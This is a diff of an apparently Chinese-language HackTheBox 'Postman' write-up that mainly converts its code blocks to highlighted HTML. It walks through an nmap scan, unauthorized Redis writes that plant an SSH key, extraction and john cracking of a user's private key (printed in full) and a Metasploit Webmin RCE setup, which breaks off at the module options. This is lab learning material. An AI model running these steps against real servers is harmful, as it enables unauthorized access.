@@ -249,8 +249,9 @@
 
 <p>nmap 对某一站点全面扫描 (<strong>SYN全端口扫描</strong>) 常用指令如下：</p>
 
-<pre><code class="language-shell">nmap -sS -sV -sC -T4 -v -p- 10.10.10.160
-</code></pre>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> <span class="nt">-v</span> <span class="nt">-p-</span> 10.10.10.160
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <blockquote>
   <p><strong>-sS:</strong>  SYN扫描是目前默认的也是最受欢迎的扫描选项</p>
@@ -265,30 +266,50 @@
 
   <p><strong>-p-:</strong> 表示从端口1扫描到65535</p>
 
-  <p><strong>Other:</strong> 扫描的时候按 <code>d</code> 可以显示 debug 信息，按 <code>x</code> 可以显示当前进度</p>
+  <p><strong>Other:</strong> 扫描的时候按 <code class="highlighter-rouge">d</code> 可以显示 debug 信息，按 <code class="highlighter-rouge">x</code> 可以显示当前进度</p>
 </blockquote>
 
-<pre><code class="language-shell">root@kali:~# nmap -sS -sV -sC -T4 -v -p- 10.10.10.160
-Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-02 21:56 CST
-Nmap scan report for Postman (10.10.10.160)
-Host is up (0.15s latency).
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td><td class="rouge-code"><pre>root@kali:~# nmap <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> <span class="nt">-v</span> <span class="nt">-p-</span> 10.10.10.160
+Starting Nmap 7.70 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-01-02 21:56 CST
+Nmap scan report <span class="k">for </span>Postman <span class="o">(</span>10.10.10.160<span class="o">)</span>
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
 Not shown: 49025 closed ports, 16506 filtered ports
 PORT      STATE SERVICE VERSION
-22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
 | ssh-hostkey: 
-|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
-|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
-|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
-80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-title: The Cyber Geek's Personal Website
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: The Cyber Geek<span class="s1">'s Personal Website
 6379/tcp  open  redis   Redis key-value store 4.0.9
 10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
-|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">Charset</span><span class="o">=</span>iso-8859-1<span class="o">)</span><span class="nb">.</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Thu Nov 28 05:28:35 2019 -- 1 IP address (1 host up) scanned in 89.52 seconds
-</code></pre>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Thu Nov 28 05:28:35 2019 -- 1 IP address (1 host up) scanned in 89.52 seconds</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>发现开放了4个端口， 80 端口在查看页面和扫描目录后未发现特别明显的漏洞，先继续看看后面两个端口。</p>
 
@@ -317,23 +338,23 @@ ssh -i /root/.ssh/id_rsa redis@10.10.10.160
 
 <ol>
   <li>
-    <p>将本地 kali 的 ssh 公钥写进文本 foo 中，在其前后添加换行符 <code>\n</code> 为了避免和Redis里其他缓存数据混合</p>
+    <p>将本地 kali 的 ssh 公钥写进文本 foo 中，在其前后添加换行符 <code class="highlighter-rouge">\n</code> 为了避免和Redis里其他缓存数据混合</p>
   </li>
   <li>
-    <p>redis-cli <code>-x</code> 参数：代表从标准输入读取数据作为该命令的最后一个参数。</p>
+    <p>redis-cli <code class="highlighter-rouge">-x</code> 参数：代表从标准输入读取数据作为该命令的最后一个参数。</p>
 
-    <p>例：<code>$echo "world" |redis-cli -x set hello</code> 等价于 <code>redis-cli set hello world</code></p>
+    <p>例：<code class="highlighter-rouge">$echo "world" |redis-cli -x set hello</code> 等价于 <code class="highlighter-rouge">redis-cli set hello world</code></p>
   </li>
   <li>
     <p>该版本的 Redis 允许任意用户未授权访问并写文件，同时 Redis 在其默认目录下拥有 ssh 密钥并对其有写权限。这导致攻击者可以用自己的公钥覆盖原文件，实现远程登录。</p>
   </li>
   <li>
-    <p>这里设定了 crackit 的键值为公钥，并通过 redis 命令变更 Redis DB 文件及存放地点为用户的 <code>.ssh</code> 文件夹，并将 <code>authorized_keys</code> 覆盖</p>
+    <p>这里设定了 crackit 的键值为公钥，并通过 redis 命令变更 Redis DB 文件及存放地点为用户的 <code class="highlighter-rouge">.ssh</code> 文件夹，并将 <code class="highlighter-rouge">authorized_keys</code> 覆盖</p>
 
     <p>这样就可以成功的将自己的公钥写入 /.ssh 文件夹的 authotrized_keys 文件里，然后攻击者就可以直接用 ssh 免密登录</p>
   </li>
   <li>
-    <p>因为靶机一直被所有人频繁修改和复写，一开始连接时需要使用 <code>flushall</code> 删除所有数据库中的所有key</p>
+    <p>因为靶机一直被所有人频繁修改和复写，一开始连接时需要使用 <code class="highlighter-rouge">flushall</code> 删除所有数据库中的所有key</p>
 
     <blockquote>
       <p><a href="https://www.00theway.org/2017/03/27/redis_exp/">redis未授权访问利用</a></p>
@@ -345,35 +366,77 @@ ssh -i /root/.ssh/id_rsa redis@10.10.10.160
 
 <p><strong>注意：</strong></p>
 
-<p>在试图 <code>set key</code> 时，可能会爆出错误 <code>(error) READONLY You can't write against a read only slave.</code></p>
+<p>在试图 <code class="highlighter-rouge">set key</code> 时，可能会爆出错误 <code class="highlighter-rouge">(error) READONLY You can't write against a read only slave.</code></p>
 
-<p>主要是因为所有人都在尝试攻破靶机，可能输入某些奇怪的命令使 redis 变成了从服务器，导致无法写入，需要使用 <code>SLAVEOF no one</code> 使其变回主服务器。</p>
+<p>主要是因为所有人都在尝试攻破靶机，可能输入某些奇怪的命令使 redis 变成了从服务器，导致无法写入，需要使用 <code class="highlighter-rouge">SLAVEOF no one</code> 使其变回主服务器。</p>
 
 <p><a href="https://xz.aliyun.com/t/5616#toc-3">SLAVEOF</a></p>
 
 <p><a href="https://juejin.im/post/58d4e31aa22b9d00645634fc">Redis 主从复制常见问题</a></p>
 
-<pre><code>10.10.10.160:6379&gt; set key "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5H80/PWYu0XeLVEQchqCtinGauFmpNPWJ//IkaeqceSE3YL6QeY33ipgkskpe1R/29jKhLJIkP0ku9ozPW9kIlz4HCDPm2C1V3tnaFAMz6P96HBGrd1XDa0cTjOkOgkeAW/YW0STn3pfjAUYXd3pIkQiD1zgkYvs2Y/Jkk+8BZ9+9nmSQkX7ic4jCwBF+HVlg4uGqK/McInB/LWNhnonRuQ0mx/IG2nSmWTX+EoFmWGyY8r2ODRr8MkxX5s9eBqhR94EiArsatHHN+Z2jWA8QhGqXliE/uQtXN42fU8P8G+VqpsADu8ZnblvTfSsVptSe0Fs6V63J1AUike9G1ejH root@kali\n\n"
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>10.10.10.160:6379&gt; set key "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5H80/PWYu0XeLVEQchqCtinGauFmpNPWJ//IkaeqceSE3YL6QeY33ipgkskpe1R/29jKhLJIkP0ku9ozPW9kIlz4HCDPm2C1V3tnaFAMz6P96HBGrd1XDa0cTjOkOgkeAW/YW0STn3pfjAUYXd3pIkQiD1zgkYvs2Y/Jkk+8BZ9+9nmSQkX7ic4jCwBF+HVlg4uGqK/McInB/LWNhnonRuQ0mx/IG2nSmWTX+EoFmWGyY8r2ODRr8MkxX5s9eBqhR94EiArsatHHN+Z2jWA8QhGqXliE/uQtXN42fU8P8G+VqpsADu8ZnblvTfSsVptSe0Fs6V63J1AUike9G1ejH root@kali\n\n"
 (error) READONLY You can't write against a read only slave.
 10.10.10.160:6379&gt; SLAVEOF no one
 OK
 10.10.10.160:6379&gt; set key "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5H80/PWYu0XeLVEQchqCtinGauFmpNPWJ//IkaeqceSE3YL6QeY33ipgkskpe1R/29jKhLJIkP0ku9ozPW9kIlz4HCDPm2C1V3tnaFAMz6P96HBGrd1XDa0cTjOkOgkeAW/YW0STn3pfjAUYXd3pIkQiD1zgkYvs2Y/Jkk+8BZ9+9nmSQkX7ic4jCwBF+HVlg4uGqK/McInB/LWNhnonRuQ0mx/IG2nSmWTX+EoFmWGyY8r2ODRr8MkxX5s9eBqhR94EiArsatHHN+Z2jWA8QhGqXliE/uQtXN42fU8P8G+VqpsADu8ZnblvTfSsVptSe0Fs6V63J1AUike9G1ejH root@kali\n\n"
 OK
 (0.95s)
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <h2 id="0x03-usertxt">0x03 User.txt</h2>
 
-<p>拿到 redis 的低权限 shell 后，在 <code>/home</code> 目录下发现用户 Matt，<code>su Mutt</code> 尝试切换发现需要密码。在 <code>.bash_history</code> 文件中发现存在 <code>id_rsa_bak</code>，因此遍历各个关键目录查找线索，在 <code>/var/opt</code> 下发现 <code>ida_rsa.bak</code> 文件，应该是 Matt 的 ssh 私钥，下面开始爆破。</p>
+<p>拿到 redis 的低权限 shell 后，在 <code class="highlighter-rouge">/home</code> 目录下发现用户 Matt，<code class="highlighter-rouge">su Mutt</code> 尝试切换发现需要密码。在 <code class="highlighter-rouge">.bash_history</code> 文件中发现存在 <code class="highlighter-rouge">id_rsa_bak</code>，因此遍历各个关键目录查找线索，在 <code class="highlighter-rouge">/var/opt</code> 下发现 <code class="highlighter-rouge">ida_rsa.bak</code> 文件，应该是 Matt 的 ssh 私钥，下面开始爆破。</p>
 
 <p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gam2ib83kzj316g0u048k.jpg" alt="Xnip2020-01-05_22-44-39" /></p>
 
-<p>通过 <code>base64</code> 和 <code>base64 -d</code> 将文件拷贝到本地 kali，命名为 Mattssh_bak</p>
+<p>通过 <code class="highlighter-rouge">base64</code> 和 <code class="highlighter-rouge">base64 -d</code> 将文件拷贝到本地 kali，命名为 Mattssh_bak</p>
 
-<pre><code class="language-shell">redis@Postman:/var$ cd /opt
-redis@Postman:/opt$ ls
-id_rsa.bak
-redis@Postman:/opt$ base64 id_rsa.bak 
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+</pre></td><td class="rouge-code"><pre>redis@Postman:/var<span class="nv">$ </span><span class="nb">cd</span> /opt
+redis@Postman:/opt<span class="nv">$ </span><span class="nb">ls
+</span>id_rsa.bak
+redis@Postman:/opt<span class="nv">$ </span><span class="nb">base64 </span>id_rsa.bak 
 LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF
 Sy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlX
 eCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtL
@@ -405,39 +468,61 @@ a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnla
 SDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZp
 NVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3
 PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
-<pre><code class="language-shell">root@kali:~/Desktop/ echo -n "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlXeCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtLSm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdHc1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNqcDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGlycVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlNR1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZdXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgzd2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpCVUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3QwVko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1pOEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVdscGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5KcjcvTWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpLZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdwM0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZmM21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01QYVZ3UkJqSXl4Q1BIRlRKM3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dWcExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0JjeU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRSVDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJKMThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnlaSDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZpNVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K" | base64 -d &gt; Mattssh_bak 
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>root@kali:~/Desktop/ <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlXeCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtLSm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdHc1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNqcDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGlycVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlNR1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZdXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgzd2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpCVUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3QwVko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1pOEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVdscGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5KcjcvTWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpLZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdwM0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZmM21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01QYVZ3UkJqSXl4Q1BIRlRKM3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dWcExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0JjeU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRSVDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJKMThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnlaSDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZpNVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K"</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> Mattssh_bak 
 
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>和上一篇博客一样，之后在本机使用 ssh2john 将密钥转换为可破解的哈希格式，再使用 john 的自带字典进行 passphrase 的爆破</p>
 
-<pre><code class="language-shell">root@kali:~/home# ssh2john Mattssh_bak &gt; matthash
-root@kali:~/home# john --wordlist=/usr/share/wordlists/rockyou.txt matthash
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre>root@kali:~/home# ssh2john Mattssh_bak <span class="o">&gt;</span> matthash
+root@kali:~/home# john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt matthash
 Using default input encoding: UTF-8
-Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
-Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
-Cost 2 (iteration count) is 2 for all loaded hashes
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64]<span class="o">)</span>
+Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
+Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 2 <span class="k">for </span>all loaded hashes
 Will run 4 OpenMP threads
-Note: This format may emit false positives, so it will keep trying even after
+Note: This format may emit <span class="nb">false </span>positives, so it will keep trying even after
 finding a possible candidate.
-Press 'q' or Ctrl-C to abort, almost any other key for status
-computer2008     (Matts.key)
-1g 0:00:00:01 10.16% (ETA: 04:52:13) 0.5319g/s 862502p/s 862502c/s 862502C/s kifra9..kieukieu
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+computer2008     <span class="o">(</span>Matts.key<span class="o">)</span>
+1g 0:00:00:01 10.16% <span class="o">(</span>ETA: 04:52:13<span class="o">)</span> 0.5319g/s 862502p/s 862502c/s 862502C/s kifra9..kieukieu
 Session aborted
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
-<p>得到 ssh 的密钥 <code>computer2008</code>，但直接使用 ssh 无法成功登录，毕竟这是备份密钥，可能已经无法使用。但 <code>computer2008</code> 作为 Matt 的一个密码可能会被重用在别的地方。先登录 redis 用户，再切换用户，尝试将密码输入，bingo!</p>
+<p>得到 ssh 的密钥 <code class="highlighter-rouge">computer2008</code>，但直接使用 ssh 无法成功登录，毕竟这是备份密钥，可能已经无法使用。但 <code class="highlighter-rouge">computer2008</code> 作为 Matt 的一个密码可能会被重用在别的地方。先登录 redis 用户，再切换用户，尝试将密码输入，bingo!</p>
 
-<pre><code class="language-shell">redis@Postman:~$ su Matt
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>redis@Postman:~<span class="nv">$ </span>su Matt
 Password: 
-Matt@Postman:/var/lib/redis$ whoami
-Matt
-Matt@Postman:/var/lib/redis$ cd
-Matt@Postman:~$ ls
-user.txt
-</code></pre>
+Matt@Postman:/var/lib/redis<span class="nv">$ </span><span class="nb">whoami
+</span>Matt
+Matt@Postman:/var/lib/redis<span class="nv">$ </span><span class="nb">cd
+</span>Matt@Postman:~<span class="nv">$ </span><span class="nb">ls
+</span>user.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <h2 id="0x04-roottxt">0x04 Root.txt</h2>
 
@@ -453,13 +538,60 @@ user.txt
 
 <p>发现 msf 已经集成了针对该版本可利用的 exploit</p>
 
-<pre><code class="language-shell">msf5 &gt; search webmin
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+</pre></td><td class="rouge-code"><pre>msf5 <span class="o">&gt;</span> search webmin
 
 Matching Modules
-================
+<span class="o">================</span>
 
-   #  Name                                         Disclosure Date  Rank       Check  Description
-   -  ----                                         ---------------  ----       -----  -----------
+   <span class="c">#  Name                                         Disclosure Date  Rank       Check  Description</span>
+   -  <span class="nt">----</span>                                         <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
    0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
    1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
    2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
@@ -468,56 +600,69 @@ Matching Modules
    5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
 
 
-msf5 &gt; use exploit/linux/http/webmin_packageup_rce
+msf5 <span class="o">&gt;</span> use exploit/linux/http/webmin_packageup_rce
 
-msf5 exploit(linux/http/webmin_packageup_rce) &gt; show options 
+msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> show options 
 
-Module options (exploit/linux/http/webmin_packageup_rce):
+Module options <span class="o">(</span>exploit/linux/http/webmin_packageup_rce<span class="o">)</span>:
 
    Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   PASSWORD   computer2008     yes       Webmin Password
-   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
-   RPORT      10000            yes       The target port (TCP)
-   SSL        true             no        Negotiate SSL/TLS for outgoing connections
-   TARGETURI  /                yes       Base path for Webmin application
